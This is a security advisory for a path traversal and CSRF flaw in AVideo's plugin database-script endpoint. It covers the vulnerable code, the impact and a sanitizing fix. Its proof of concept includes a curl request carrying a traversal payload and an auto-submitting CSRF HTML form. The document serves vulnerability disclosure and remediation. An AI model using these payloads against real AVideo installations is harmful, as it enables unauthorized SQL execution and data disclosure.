# [H] AVideo has Path Traversal in pluginRunDatabaseScript.json.php Enables Arbitrary SQL File Execution via Unsanitized Plugin Name

## Summary
Severity: High
Advisory: GHSA-3hwv-x8g3-9qpr
CVE: CVE-2026-33681
CWE: CWE-22
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-3hwv-x8g3-9qpr
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `objects/pluginRunDatabaseScript.json.php` endpoint accepts a `name` parameter via POST and passes it to `Plugin::getDatabaseFileName()` without any path traversal sanitization. This allows an authenticated admin (or an attacker via CSRF) to traverse outside the plugin directory and execute the contents of any `install/install.sql` file on the filesystem as raw SQL queries against the application database.

## Details

The vulnerable data flow:

**1. Entry point** — `objects/pluginRunDatabaseScript.json.php:21`:
```php
$fileName = Plugin::getDatabaseFileName($_POST['name']);
```

**2. "Sanitization"** — `objects/plugin.php:343-354`:
```php
public static function getDatabaseFileName($pluginName)
{
    global $global;
    $pluginName = AVideoPlugin::fixName($pluginName);  // line 347 — no-op
    $dir = $global['systemRootPath'] . "plugin";
    $filename = $dir . DIRECTORY_SEPARATOR . $pluginName . DIRECTORY_SEPARATOR . "install" . DIRECTORY_SEPARATOR . "install.sql";
    if (!file_exists($filename)) {
        return false;
    }
    return $filename;
}
```

**3. The "fix"** — `plugin/AVideoPlugin.php:3184-3190`:
```php
public static function fixName($name)
{
    if ($name === 'Programs') {
        return 'PlayLists';
    }
    return $name;  // Returns input unchanged for all other values
}
```

**4. SQL execution** — `objects/pluginRunDatabaseScript.json.php:24-36`:
```php
$lines = file($fileName);
foreach ($lines as $line) {
    // ...
    if (!$global['mysqli']->query($templine)) {
        $obj->msg = ('Error performing query \'<strong>' . $templine . '\': ' . $global['mysqli']->error);
        die($templine.' '.json_encode($obj));  // Leaks file content + SQL error
    }
}
```

The sibling endpoint `pluginRunUpdateScript.json.php` correctly routes through `AVideoPlugin::loadPlugin()` which sanitizes the name with `preg_replace('/[^0-9a-z_]/i', '', $name)` at `AVideoPlugin.php:395`. The vulnerable endpoint bypasses this sanitization entirely.

Additionally, the endpoint lacks CSRF token validation. The related `pluginImport.json.php` properly checks `isGlobalTokenValid()`, but `pluginRunDatabaseScript.json.php` does not, making it exploitable via cross-site request forgery against an authenticated admin.

## PoC

**Step 1: Direct exploitation (as admin)**

```bash
# Traverse to another plugin's install.sql (e.g., from CustomPlugin to LiveLinks)
curl -s -b "PHPSESSID=<admin_session>" \
  -d "name=../plugin/LiveLinks" \
  "https://target.com/objects/pluginRunDatabaseScript.json.php"
```

This resolves to: `{root}/plugin/../plugin/LiveLinks/install/install.sql` and executes its SQL.

**Step 2: CSRF exploitation (no direct admin access needed)**

Host the following HTML on an attacker-controlled page and trick an admin into visiting it:

```html
<html>
<body>
<form action="https://target.com/objects/pluginRunDatabaseScript.json.php" method="POST" id="csrf">
  <input type="hidden" name="name" value="../../attacker-controlled-path" />
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

**Step 3: Information disclosure via error messages**

If the traversed SQL file contains invalid SQL, lines 32-33 leak the raw file content in the error response:
```json
{"error":true,"msg":"Error performing query '<strong>FILE CONTENT HERE': MySQL error..."}
```

## Impact

- **SQL injection via file inclusion**: An attacker can execute arbitrary SQL from any `install/install.sql` file reachable via path traversal, potentially creating admin accounts, modifying data, or extracting sensitive information.
- **Information disclosure**: SQL execution errors leak raw file contents and MySQL error messages in the HTTP response.
- **CSRF amplification**: The lack of CSRF protection means an external attacker can exploit this vulnerability by tricking an admin into visiting a malicious page, without needing direct admin credentials.
- **Chaining potential**: If combined with any file-write primitive (e.g., GHSA-v8jw-8w5p-23g3, the plugin ZIP extraction RCE), an attacker can write a malicious `install.sql` file and then execute it via this endpoint.

## Recommended Fix

Apply the same sanitization used by `loadPlugin()` to strip path traversal characters, and add CSRF token validation:

```php
// In objects/pluginRunDatabaseScript.json.php, after line 14:

// Add CSRF protection
if (!isGlobalTokenValid()) {
    die('{"error":"' . __("Invalid token") . '"}');
}

// Sanitize plugin name before use (line 21)
$pluginName = trim(preg_replace('/[^0-9a-z_]/i', '', $_POST['name']));
$fileName = Plugin::getDatabaseFileName($pluginName);
```

Alternatively, fix `AVideoPlugin::fixName()` to apply proper sanitization for all callers:

```php
public static function fixName($name)
{
    if ($name === 'Programs') {
        $name = 'PlayLists';
    }
    return trim(preg_replace('/[^0-9a-z_]/i', '', $name));
}
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-3hwv-x8g3-9qpr
- https://nvd.nist.gov/vuln/detail/CVE-2026-33681
- https://github.com/WWBN/AVideo/commit/81b591c509835505cb9f298aa1162ac64c4152cb
- https://github.com/WWBN/AVideo
- https://github.com/advisories/GHSA-v8jw-8w5p-23g3
